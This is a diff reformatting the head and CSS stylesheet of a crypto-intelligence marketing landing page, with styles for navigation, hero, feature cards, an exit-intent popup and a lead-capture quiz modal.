@@ -1,401 +1,1889 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Brave New Coin — Institutional Digital Asset Intelligence Brief</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap"
-        rel="stylesheet" />
-    <style>
-        :root {
-            --bg: #FFFFFF;
-            --bg-secondary: #F4F7FC;
-            --bg-dark: #0B1220;
-            --bg-dark-surface: #121C30;
-            --surface: #FFFFFF;
-            --surface-alt: #EEF3FB;
-            --border: #D6E2F0;
-            --border-dark: #1E2D47;
-            --text: #0D1B2E;
-            --text-muted: #5A7190;
-            --text-faint: #8BA3BE;
-            --brand-primary: #007BFF;
-            --brand-primary-dark: #0062CC;
-            --brand-amber: #FF9F00;
-            --brand-amber-dark: #CC7E00;
-            --brand-green: #00C48C;
-            --brand-red: #F03D3D;
-            --radius: 6px;
-            --radius-lg: 12px;
-            --mono: 'JetBrains Mono', monospace;
-            --sans: 'Inter', sans-serif;
-            --shadow-card: 0 2px 12px rgba(0,60,140,0.08);
-            --shadow-modal: 0 24px 80px rgba(0,20,60,0.18);
-        }
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Brave New Coin — Institutional Digital Asset Intelligence Brief</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet"/>
+<style>
+:root {
+  --bg: #FFFFFF;
+  --bg-secondary: #F4F7FC;
+  --bg-dark: #0B1220;
+  --bg-dark-surface: #121C30;
+  --surface: #FFFFFF;
+  --surface-alt: #EEF3FB;
+  --border: #D6E2F0;
+  --border-dark: #1E2D47;
+  --text: #0D1B2E;
+  --text-muted: #5A7190;
+  --text-faint: #8BA3BE;
+  --brand-primary: #007BFF;
+  --brand-primary-dark: #0062CC;
+  --brand-amber: #FF9F00;
+  --brand-amber-dark: #CC7E00;
+  --brand-green: #00C48C;
+  --brand-red: #F03D3D;
+  --radius: 6px;
+  --radius-lg: 12px;
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'Inter', sans-serif;
+  --shadow-card: 0 2px 12px rgba(0,60,140,0.08);
+  --shadow-modal: 0 24px 80px rgba(0,20,60,0.18);
+}
 
-        *,
-        *::before,
-        *::after {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+*,*::before,*::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-        html {
-            scroll-behavior: smooth;
-        }
+html { scroll-behavior: smooth; }
 
-        body {
-            font-family: var(--sans);
-            background: var(--bg);
-            color: var(--text);
-            font-size: 15px;
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--text);
+  font-size: 15px;
+  line-height: 1.6;
+  overflow-x: hidden;
+}
 
-        a {
-            color: var(--brand-primary);
-            text-decoration: none;
-        }
+a { color: var(--brand-primary); text-decoration: none; }
 
-        /* ═══════════════════════════════════════════   STICKY NAV═══════════════════════════════════════════ */
-        .nav {
-            position: sticky;
-            top: 0;
-            z-index: 900;
-            background: rgba(255,255,255,0.97);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid var(--border);
-            height: 60px;
-            display: flex;
-            align-items: center;
-            padding: 0 32px;
-        }
+/* ═══════════════════════════════════════════
+   STICKY NAV
+═══════════════════════════════════════════ */
+.nav {
+  position: sticky;
+  top: 0;
+  z-index: 900;
+  background: rgba(255,255,255,0.97);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 32px;
+}
+.nav-inner {
+  max-width: 1240px;
+  width: 100%;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 24px;
+}
+.nav-logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-weight: 700;
+  font-size: 15px;
+  color: var(--text);
+  white-space: nowrap;
+}
+.nav-links {
+  display: flex;
+  align-items: center;
+  gap: 28px;
+  list-style: none;
+}
+.nav-links a {
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text-muted);
+  transition: color .15s;
+}
+.nav-links a:hover { color: var(--brand-primary); }
+.nav-cta {
+  background: var(--brand-primary);
+  color: #fff !important;
+  padding: 8px 20px;
+  border-radius: var(--radius);
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  border: none;
+  white-space: nowrap;
+  transition: background .15s, transform .1s;
+}
+.nav-cta:hover { background: var(--brand-primary-dark); transform: translateY(-1px); }
 
-        .nav-inner {
-            max-width: 1240px;
-            width: 100%;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 24px;
-        }
+/* ═══════════════════════════════════════════
+   HERO
+═══════════════════════════════════════════ */
+.hero {
+  max-width: 1240px;
+  margin: 0 auto;
+  padding: 72px 32px 60px;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 64px;
+  align-items: center;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: #EEF6FF;
+  border: 1px solid #C2DCFF;
+  border-radius: 40px;
+  padding: 5px 14px 5px 10px;
+  font-size: 11px;
+  font-weight: 600;
+  font-family: var(--mono);
+  color: var(--brand-primary);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+  margin-bottom: 22px;
+}
+.hero-badge-dot {
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: var(--brand-green);
+  animation: pulse 2s infinite;
+}
+@keyframes pulse {
+  0%,100% { box-shadow: 0 0 0 0 rgba(0,196,140,0.5); }
+  50% { box-shadow: 0 0 0 5px rgba(0,196,140,0); }
+}
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 500;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-bottom: 16px;
+}
+.hero h1 {
+  font-size: 42px;
+  font-weight: 800;
+  line-height: 1.12;
+  color: var(--text);
+  margin-bottom: 20px;
+  letter-spacing: -0.02em;
+}
+.hero h1 span {
+  color: var(--brand-primary);
+}
+.hero-sub {
+  font-size: 16px;
+  color: var(--text-muted);
+  line-height: 1.7;
+  max-width: 480px;
+  margin-bottom: 32px;
+}
+.hero-actions {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  flex-wrap: wrap;
+}
+.btn-primary {
+  background: var(--brand-primary);
+  color: #fff;
+  padding: 13px 28px;
+  border-radius: var(--radius);
+  font-size: 14px;
+  font-weight: 700;
+  cursor: pointer;
+  border: none;
+  transition: background .15s, transform .1s, box-shadow .15s;
+  box-shadow: 0 4px 16px rgba(0,123,255,0.28);
+}
+.btn-primary:hover { background: var(--brand-primary-dark); transform: translateY(-2px); box-shadow: 0 6px 24px rgba(0,123,255,0.36); }
+.btn-secondary {
+  background: transparent;
+  color: var(--text-muted);
+  padding: 13px 20px;
+  border-radius: var(--radius);
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  border: 1px solid var(--border);
+  transition: all .15s;
+}
+.btn-secondary:hover { border-color: var(--brand-primary); color: var(--brand-primary); }
+.hero-disclaimer {
+  margin-top: 14px;
+  font-size: 11px;
+  font-family: var(--mono);
+  color: var(--text-faint);
+}
 
-        .nav-logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: 700;
-            font-size: 15px;
-            color: var(--text);
-            white-space: nowrap;
-        }
+/* Hero right - dashboard panel */
+.hero-panel {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  overflow: hidden;
+  box-shadow: var(--shadow-card);
+}
+.hero-panel-bar {
+  background: var(--bg-dark);
+  padding: 10px 16px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.panel-dot { width:10px;height:10px;border-radius:50%; }
+.panel-dot.r{background:#F03D3D;}
+.panel-dot.y{background:#FFB800;}
+.panel-dot.g{background:#00C48C;}
+.panel-bar-title {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: rgba(255,255,255,0.4);
+  margin-left: 8px;
+}
+.hero-panel-tabs {
+  display: flex;
+  border-bottom: 1px solid var(--border);
+  background: #F8FAFD;
+}
+.panel-tab {
+  padding: 8px 16px;
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 500;
+  color: var(--text-muted);
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+  white-space: nowrap;
+}
+.panel-tab.active { color: var(--brand-primary); border-bottom-color: var(--brand-primary); background: #fff; }
+.hero-panel-body { padding: 20px 20px 16px; }
+.panel-section-label {
+  font-family: var(--mono);
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--text-faint);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-bottom: 10px;
+}
+.panel-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 7px 10px;
+  border-radius: 4px;
+  margin-bottom: 3px;
+  background: #fff;
+  border: 1px solid var(--border);
+}
+.panel-row-name { font-family: var(--mono); font-size: 12px; font-weight: 500; color: var(--text); }
+.panel-row-ticker { font-family: var(--mono); font-size: 10px; color: var(--text-faint); margin-left:6px; }
+.panel-row-val { font-family: var(--mono); font-size: 12px; font-weight: 700; }
+.panel-row-val.up { color: var(--brand-green); }
+.panel-row-val.dn { color: var(--brand-red); }
+.panel-row-val.nt { color: var(--text-muted); }
 
-        .nav-links {
-            display: flex;
-            align-items: center;
-            gap: 28px;
-            list-style: none;
-        }
+/* ═══════════════════════════════════════════
+   TRUST STRIP
+═══════════════════════════════════════════ */
+.trust-strip {
+  background: var(--bg-dark);
+  border-top: 1px solid var(--border-dark);
+  border-bottom: 1px solid var(--border-dark);
+  padding: 22px 32px;
+}
+.trust-inner {
+  max-width: 1240px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 24px;
+  flex-wrap: wrap;
+}
+.trust-stat {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 3px;
+}
+.trust-stat-val {
+  font-family: var(--mono);
+  font-size: 22px;
+  font-weight: 700;
+  color: #fff;
+}
+.trust-stat-val em { color: var(--brand-amber); font-style: normal; }
+.trust-stat-label {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: rgba(255,255,255,0.4);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  text-align: center;
+}
+.trust-divider {
+  width: 1px;
+  height: 36px;
+  background: var(--border-dark);
+  flex-shrink: 0;
+}
 
-        .nav-links a {
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-muted);
-            transition: color .15s;
-        }
+/* ═══════════════════════════════════════════
+   FEATURE GRID
+═══════════════════════════════════════════ */
+.section {
+  padding: 80px 32px;
+}
+.section-dark {
+  background: var(--bg-secondary);
+  border-top: 1px solid var(--border);
+  border-bottom: 1px solid var(--border);
+}
+.section-inner {
+  max-width: 1240px;
+  margin: 0 auto;
+}
+.section-header {
+  text-align: center;
+  margin-bottom: 56px;
+}
+.section-kicker {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--brand-primary);
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-bottom: 12px;
+}
+.section-title {
+  font-size: 32px;
+  font-weight: 800;
+  color: var(--text);
+  line-height: 1.18;
+  letter-spacing: -0.02em;
+  margin-bottom: 14px;
+}
+.section-sub {
+  font-size: 15px;
+  color: var(--text-muted);
+  max-width: 560px;
+  margin: 0 auto;
+  line-height: 1.7;
+}
+.feature-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 20px;
+}
+.feature-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: 28px;
+  transition: box-shadow .2s, border-color .2s;
+}
+.feature-card:hover {
+  box-shadow: var(--shadow-card);
+  border-color: #BCD5F7;
+}
+.feature-viz {
+  width: 100%;
+  height: 96px;
+  margin-bottom: 20px;
+  border-radius: var(--radius);
+  background: var(--bg-secondary);
+  overflow: hidden;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.feature-card h3 {
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--text);
+  margin-bottom: 8px;
+}
+.feature-card p {
+  font-size: 13px;
+  color: var(--text-muted);
+  line-height: 1.65;
+}
+.feature-tag {
+  display: inline-block;
+  margin-top: 14px;
+  padding: 3px 10px;
+  border-radius: 40px;
+  font-family: var(--mono);
+  font-size: 10px;
+  font-weight: 600;
+  background: #EEF6FF;
+  color: var(--brand-primary);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+}
+.feature-tag.amber { background: #FFF5E0; color: var(--brand-amber-dark); }
+.feature-tag.green { background: #E0FAF3; color: #007A59; }
 
-        .nav-links a:hover {
-            color: var(--brand-primary);
-        }
+/* ═══════════════════════════════════════════
+   SAMPLE OUTPUT / MOCKUP
+═══════════════════════════════════════════ */
+.mockup-wrapper {
+  display: grid;
+  grid-template-columns: 340px 1fr;
+  gap: 32px;
+  align-items: start;
+}
+.mockup-panel {
+  background: var(--bg-dark);
+  border: 1px solid var(--border-dark);
+  border-radius: var(--radius-lg);
+  overflow: hidden;
+}
+.mockup-header {
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--border-dark);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.mockup-title {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 700;
+  color: rgba(255,255,255,0.6);
+  text-transform: uppercase;
+  letter-spacing: 0.07em;
+}
+.mockup-badge {
+  font-family: var(--mono);
+  font-size: 9px;
+  font-weight: 700;
+  color: var(--brand-green);
+  background: rgba(0,196,140,0.12);
+  border: 1px solid rgba(0,196,140,0.3);
+  padding: 2px 8px;
+  border-radius: 40px;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+.mockup-body { padding: 20px; }
+.mockup-row {
+  display: flex;
+  justify-content: space-between;
+  padding: 8px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.05);
+  align-items: center;
+}
+.mockup-row:last-child { border-bottom: none; }
+.mockup-key { font-family: var(--mono); font-size: 11px; color: rgba(255,255,255,0.4); }
+.mockup-val { font-family: var(--mono); font-size: 11px; font-weight: 600; }
+.mockup-val.blue { color: #5BAEFF; }
+.mockup-val.amber { color: var(--brand-amber); }
+.mockup-val.green { color: var(--brand-green); }
+.mockup-val.red { color: var(--brand-red); }
+.mockup-val.white { color: rgba(255,255,255,0.85); }
 
-        .nav-cta {
-            background: var(--brand-primary);
-            color: #fff !important;
-            padding: 8px 20px;
-            border-radius: var(--radius);
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            border: none;
-            white-space: nowrap;
-            transition: background .15s, transform .1s;
-        }
+.mockup-right { display: flex; flex-direction: column; gap: 20px; }
+.mockup-section {
+  background: #fff;
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  overflow: hidden;
+}
+.mockup-section-head {
+  padding: 12px 20px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg-secondary);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.mockup-section-icon {
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: var(--brand-primary);
+}
+.mockup-section-label {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.07em;
+}
+.mockup-section-body { padding: 16px 20px; }
+.flag-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 8px 0;
+  border-bottom: 1px solid var(--border);
+}
+.flag-item:last-child { border-bottom: none; }
+.flag-dot { width:8px;height:8px;border-radius:50%;margin-top:5px;flex-shrink:0; }
+.flag-text { font-size: 13px; color: var(--text); line-height: 1.5; }
+.flag-sub { font-family: var(--mono); font-size: 10px; color: var(--text-faint); margin-top: 2px; }
 
-        .nav-cta:hover {
-            background: var(--brand-primary-dark);
-            transform: translateY(-1px);
-        }
+/* ═══════════════════════════════════════════
+   FINAL CTA
+═══════════════════════════════════════════ */
+.final-cta {
+  background: linear-gradient(135deg, #003A80 0%, #0062CC 60%, #005EB8 100%);
+  padding: 80px 32px;
+  text-align: center;
+}
+.final-cta h2 {
+  font-size: 36px;
+  font-weight: 800;
+  color: #fff;
+  letter-spacing: -0.02em;
+  margin-bottom: 16px;
+  line-height: 1.15;
+}
+.final-cta p {
+  font-size: 15px;
+  color: rgba(255,255,255,0.7);
+  max-width: 520px;
+  margin: 0 auto 32px;
+  line-height: 1.7;
+}
+.btn-white {
+  background: #fff;
+  color: var(--brand-primary-dark);
+  padding: 14px 32px;
+  border-radius: var(--radius);
+  font-size: 15px;
+  font-weight: 700;
+  cursor: pointer;
+  border: none;
+  transition: transform .15s, box-shadow .15s;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+}
+.btn-white:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(0,0,0,0.3); }
+.final-cta-note {
+  margin-top: 16px;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: rgba(255,255,255,0.4);
+}
 
-        /* ═══════════════════════════════════════════   HERO═══════════════════════════════════════════ */
-        .hero {
-            max-width: 1240px;
-            margin: 0 auto;
-            padding: 72px 32px 60px;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 64px;
-            align-items: center;
-        }
+/* ═══════════════════════════════════════════
+   FOOTER
+═══════════════════════════════════════════ */
+footer {
+  background: var(--bg-dark);
+  border-top: 1px solid var(--border-dark);
+  padding: 40px 32px;
+}
+.footer-inner {
+  max-width: 1240px;
+  margin: 0 auto;
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  gap: 32px;
+  flex-wrap: wrap;
+}
+.footer-brand { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+.footer-brand-name { font-weight: 700; font-size: 14px; color: #fff; }
+.footer-legal {
+  font-size: 11px;
+  color: rgba(255,255,255,0.3);
+  max-width: 520px;
+  line-height: 1.7;
+}
+.footer-links {
+  display: flex;
+  gap: 20px;
+  flex-wrap: wrap;
+}
+.footer-links a {
+  font-size: 12px;
+  color: rgba(255,255,255,0.35);
+  transition: color .15s;
+}
+.footer-links a:hover { color: rgba(255,255,255,0.7); }
+.footer-copy {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: rgba(255,255,255,0.2);
+  margin-top: 28px;
+  border-top: 1px solid var(--border-dark);
+  padding-top: 20px;
+}
 
-        .hero-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #EEF6FF;
-            border: 1px solid #C2DCFF;
-            border-radius: 40px;
-            padding: 5px 14px 5px 10px;
-            font-size: 11px;
-            font-weight: 600;
-            font-family: var(--mono);
-            color: var(--brand-primary);
-            text-transform: uppercase;
-            letter-spacing: 0.04em;
-            margin-bottom: 22px;
-        }
+/* ═══════════════════════════════════════════
+   MODAL OVERLAY
+═══════════════════════════════════════════ */
+.modal-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(7,15,30,0.72);
+  z-index: 1000;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  backdrop-filter: blur(4px);
+  animation: fadeIn .2s ease;
+}
+.modal-overlay.active { display: flex; }
+@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
 
-        .hero-badge-dot {
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: var(--brand-green);
-            animation: pulse 2s infinite;
-        }
+/* ═══════════════════════════════════════════
+   EXIT-INTENT POPUP
+═══════════════════════════════════════════ */
+.exit-popup {
+  background: var(--bg-dark);
+  border: 1px solid var(--border-dark);
+  border-radius: var(--radius-lg);
+  max-width: 500px;
+  width: 100%;
+  overflow: hidden;
+  animation: slideUp .28s cubic-bezier(0.34,1.2,0.64,1);
+  box-shadow: var(--shadow-modal);
+}
+@keyframes slideUp { from{opacity:0;transform:translateY(24px)} to{opacity:1;transform:translateY(0)} }
+.exit-popup-accent {
+  height: 3px;
+  background: linear-gradient(90deg, var(--brand-primary) 0%, var(--brand-amber) 100%);
+}
+.exit-popup-body { padding: 32px 36px 36px; }
+.exit-popup-icon { margin-bottom: 16px; }
+.exit-popup h2 {
+  font-size: 22px;
+  font-weight: 800;
+  color: #fff;
+  line-height: 1.25;
+  margin-bottom: 12px;
+}
+.exit-popup p {
+  font-size: 14px;
+  color: rgba(255,255,255,0.55);
+  line-height: 1.65;
+  margin-bottom: 24px;
+}
+.exit-popup-cta {
+  width: 100%;
+  padding: 13px;
+  background: var(--brand-primary);
+  color: #fff;
+  border: none;
+  border-radius: var(--radius);
+  font-size: 14px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background .15s;
+  margin-bottom: 10px;
+}
+.exit-popup-cta:hover { background: var(--brand-primary-dark); }
+.exit-dismiss {
+  display: block;
+  text-align: center;
+  font-size: 12px;
+  color: rgba(255,255,255,0.25);
+  cursor: pointer;
+  transition: color .15s;
+  background: none;
+  border: none;
+  width: 100%;
+}
+.exit-dismiss:hover { color: rgba(255,255,255,0.5); }
 
-        @keyframes pulse {
-            0%,100% {
-                box-shadow: 0 0 0 0 rgba(0,196,140,0.5);
-            }
-            50% {
-                box-shadow: 0 0 0 5px rgba(0,196,140,0);
-            }
-        }
+/* ═══════════════════════════════════════════
+   QUIZ MODAL
+═══════════════════════════════════════════ */
+.quiz-modal {
+  background: #fff;
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  max-width: 620px;
+  width: 100%;
+  max-height: 90vh;
+  overflow-y: auto;
+  animation: slideUp .28s cubic-bezier(0.34,1.2,0.64,1);
+  box-shadow: var(--shadow-modal);
+}
+.quiz-header {
+  position: sticky;
+  top: 0;
+  z-index: 10;
+  background: var(--bg-dark);
+  padding: 20px 28px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.quiz-header-left { display: flex; align-items: center; gap: 12px; }
+.quiz-header-title {
+  font-family: var(--mono);
+  font-size: 12px;
+  font-weight: 700;
+  color: rgba(255,255,255,0.7);
+  text-transform: uppercase;
+  letter-spacing: 0.07em;
+}
+.quiz-step-counter {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: rgba(255,255,255,0.35);
+}
+.quiz-close {
+  width: 28px; height: 28px;
+  background: rgba(255,255,255,0.08);
+  border: none;
+  border-radius: 50%;
+  color: rgba(255,255,255,0.5);
+  font-size: 16px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: background .15s;
+}
+.quiz-close:hover { background: rgba(255,255,255,0.15); }
+.quiz-progress {
+  height: 3px;
+  background: rgba(255,255,255,0.08);
+  position: relative;
+}
+.quiz-progress-bar {
+  height: 100%;
+  background: linear-gradient(90deg, var(--brand-primary), var(--brand-amber));
+  transition: width .3s ease;
+}
+.quiz-body { padding: 32px 28px; }
+.quiz-step { display: none; }
+.quiz-step.active { display: block; }
+.quiz-q-num {
+  font-family: var(--mono);
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--brand-primary);
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-bottom: 10px;
+}
+.quiz-q-text {
+  font-size: 19px;
+  font-weight: 700;
+  color: var(--text);
+  line-height: 1.3;
+  margin-bottom: 8px;
+  letter-spacing: -0.01em;
+}
+.quiz-q-sub {
+  font-size: 13px;
+  color: var(--text-muted);
+  margin-bottom: 24px;
+  line-height: 1.6;
+}
+.option-list { display: flex; flex-direction: column; gap: 10px; }
+.option-item {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 14px 18px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius);
+  cursor: pointer;
+  transition: all .15s;
+}
+.option-item:hover { border-color: var(--brand-primary); background: #F0F7FF; }
+.option-item.sel { border-color: var(--brand-primary); background: #EEF6FF; }
+.option-radio {
+  width: 18px; height: 18px;
+  border-radius: 50%;
+  border: 2px solid var(--border);
+  flex-shrink: 0;
+  transition: all .15s;
+  display: flex; align-items: center; justify-content: center;
+}
+.option-item.sel .option-radio {
+  border-color: var(--brand-primary);
+  background: var(--brand-primary);
+}
+.option-item.sel .option-radio::after {
+  content: '';
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: #fff;
+}
+.option-label { font-size: 14px; font-weight: 500; color: var(--text); line-height: 1.4; }
+.option-label span { display:block; font-size:12px;font-weight:400;color:var(--text-muted);margin-top:2px; }
 
-        .hero-eyebrow {
-            font-family: var(--mono);
-            font-size: 11px;
-            font-weight: 500;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-            margin-bottom: 16px;
-        }
+/* Checkbox options for step 5 */
+.checkbox-grid { display: flex; flex-wrap: wrap; gap: 10px; }
+.checkbox-tag {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 9px 16px;
+  border: 1.5px solid var(--border);
+  border-radius: 40px;
+  cursor: pointer;
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text);
+  transition: all .15s;
+  user-select: none;
+}
+.checkbox-tag:hover { border-color: var(--brand-primary); color: var(--brand-primary); }
+.checkbox-tag.sel { border-color: var(--brand-primary); background: #EEF6FF; color: var(--brand-primary); }
+.checkbox-tag .ck { width:14px;height:14px;border-radius:3px;border:2px solid var(--border);transition:all .15s;flex-shrink:0; }
+.checkbox-tag.sel .ck { background:var(--brand-primary);border-color:var(--brand-primary); background-image:url("data:image/svg+xml,%3Csvg width='10' height='8' viewBox='0 0 10 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 4L3.5 6.5L9 1' stroke='white' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:center; }
 
-        .hero h1 {
-            font-size: 42px;
-            font-weight: 800;
-            line-height: 1.12;
-            color: var(--text);
-            margin-bottom: 20px;
-            letter-spacing: -0.02em;
-        }
+/* Email input */
+.email-field {
+  margin-top: 24px;
+  border-top: 1px solid var(--border);
+  padding-top: 24px;
+}
+.email-field label {
+  display: block;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text);
+  margin-bottom: 8px;
+}
+.email-field input {
+  width: 100%;
+  padding: 12px 16px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius);
+  font-size: 14px;
+  font-family: var(--sans);
+  color: var(--text);
+  outline: none;
+  transition: border-color .15s;
+}
+.email-field input:focus { border-color: var(--brand-primary); }
+.email-field input.err { border-color: var(--brand-red); }
+.email-error { font-size: 12px; color: var(--brand-red); margin-top: 5px; display: none; }
 
-        .hero h1 span {
-            color: var(--brand-primary);
-        }
+/* Quiz footer */
+.quiz-footer {
+  padding: 0 28px 28px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.quiz-back {
+  background: none;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 10px 18px;
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text-muted);
+  cursor: pointer;
+  transition: all .15s;
+}
+.quiz-back:hover { border-color: var(--text-muted); color: var(--text); }
+.quiz-back[disabled] { opacity: 0; pointer-events: none; }
+.quiz-next {
+  background: var(--brand-primary);
+  border: none;
+  border-radius: var(--radius);
+  padding: 11px 28px;
+  font-size: 14px;
+  font-weight: 700;
+  color: #fff;
+  cursor: pointer;
+  transition: background .15s, opacity .15s;
+}
+.quiz-next:disabled { opacity: 0.35; cursor: not-allowed; }
+.quiz-next:not(:disabled):hover { background: var(--brand-primary-dark); }
 
-        .hero-sub {
-            font-size: 16px;
-            color: var(--text-muted);
-            line-height: 1.7;
-            max-width: 480px;
-            margin-bottom: 32px;
-        }
+/* Loading step */
+.quiz-loader { text-align: center; padding: 40px 20px; }
+.loader-ring {
+  width: 56px; height: 56px;
+  border: 3px solid var(--border);
+  border-top-color: var(--brand-primary);
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+  margin: 0 auto 24px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.loader-title { font-size: 17px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
+.loader-sub { font-size: 13px; color: var(--text-muted); margin-bottom: 28px; line-height: 1.6; }
+.checklist { display: flex; flex-direction: column; gap: 10px; text-align: left; max-width: 340px; margin: 0 auto; }
+.checklist-item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 13px;
+  color: var(--text-muted);
+  transition: color .3s;
+}
+.checklist-item.done { color: var(--text); }
+.check-icon {
+  width: 20px; height: 20px;
+  border-radius: 50%;
+  border: 2px solid var(--border);
+  flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  transition: all .3s;
+  font-size: 10px;
+}
+.checklist-item.done .check-icon { background: var(--brand-green); border-color: var(--brand-green); color: #fff; }
 
-        .hero-actions {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
+/* Success step */
+.quiz-success { text-align: center; padding: 40px 20px 20px; }
+.success-icon-wrap {
+  width: 72px; height: 72px;
+  background: #E0FAF3;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 20px;
+  animation: popIn .4s cubic-bezier(0.34,1.4,0.64,1);
+}
+@keyframes popIn { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
+.quiz-success h2 { font-size: 22px; font-weight: 800; color: var(--text); margin-bottom: 10px; }
